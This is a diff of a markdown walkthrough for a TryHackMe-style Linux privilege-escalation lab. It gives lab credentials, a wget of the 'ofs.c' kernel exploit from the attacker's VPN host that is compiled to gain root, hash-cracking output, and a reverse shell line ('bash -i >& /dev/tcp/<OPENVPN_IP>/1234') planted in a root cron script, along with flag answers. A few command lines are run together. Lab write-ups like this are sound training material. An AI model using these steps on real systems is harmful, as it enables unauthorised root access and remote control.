@@ -2,8 +2,8 @@
 ## Enumeration
 ### What is the hostname of the target system?
 ```bash
-$ ssh karen@10.10.207.133
-karen@10.10.207.133 password: Password1
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
 $ hostname
 wade7363
 ```
@@ -36,11 +36,11 @@ Python 2.7.6
 ## Kernel Exploits
 ### What is the content of the `flag1.txt` file?
 ```bash
-$ ssh karen@10.10.239.187
-karen@10.10.239.187 password: Password1
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 karen@wade7363:/home/matt$ cd /tmp
-karen@wade7363:/tmp$ wget http://10.4.32.172/ofs.c -O ofs.ckaren@wade7363:/tmp$ gcc -o ofs ofs.c
+karen@wade7363:/tmp$ wget http://<OPENVPN_IP>/ofs.c -O ofs.ckaren@wade7363:/tmp$ gcc -o ofs ofs.c
 karen@wade7363:/tmp$ ./ofs
 # cat /python3 -c 'import pty; pty.spawn("/bin/bash")'
 root@wade7363:/tmp# cat /home/matt/flag1.txt 
@@ -51,8 +51,8 @@ THM-28392872729920
 ## `sudo`
 ### How many programs can the user `karen` run on the target system with `sudo` rights?
 ```bash
-$ ssh karen@10.10.239.187
-karen@10.10.239.187 password: Password1
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 karen@ip-10-10-123-126:/$ sudo -l
 Matching Defaults entries for karen on ip-10-10-123-126:
@@ -125,8 +125,8 @@ frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelW
 ## SUID
 ### Which user shares the name of a great comic book writer?
 ```bash
-$ ssh karen@10.10.239.187
-karen@10.10.239.187 password: Password1
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 karen@ip-10-10-182-233:/$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -281,5 +281,83 @@ Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
 Candidates.#2....: theking -> gemini1
 ```
 
+**Answer**: `Password1`
 ### What is the content of the `flag3.txt` file?
+```bash
+karen@ip-10-10-182-233:/$ su user2
+Password: Password1
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+user2@ip-10-10-182-233:/$ base64 /home/ubuntu/flag3.txt | base64 --decode
+THM-3847834
+```
+**Flag 3**: `THM-3847834`
+## Capabilities
+### How many binaries have set capabilities?
+```bash
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+karen@ip-10-10-108-224:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+```
 
+**Answer**: `6`
+### What other binary can be used through its capabilities?
+**Answer**: `view`
+### What is the content of the `flag4.txt` file?
+```bash
+karen@ip-10-10-108-224:~$ cd /home/ubuntu/
+karen@ip-10-10-108-224:/home/ubuntu$ cat flag4.txt 
+THM-9349843
+```
+
+**Flag 4**: `THM-9349843`
+## Cron Jobs
+#### How many cron jobs can you see on the target system?
+```bash
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+karen@ip-10-10-30-209:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+
+**Answer**: `4`
+### What is the content of the `flag5.txt` file?
+1. Edit `backup.sh` with `nano` or your preferred editor:
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/<OPENVPN_IP>/1234 0>&1
+```
+### What is Matt's password?
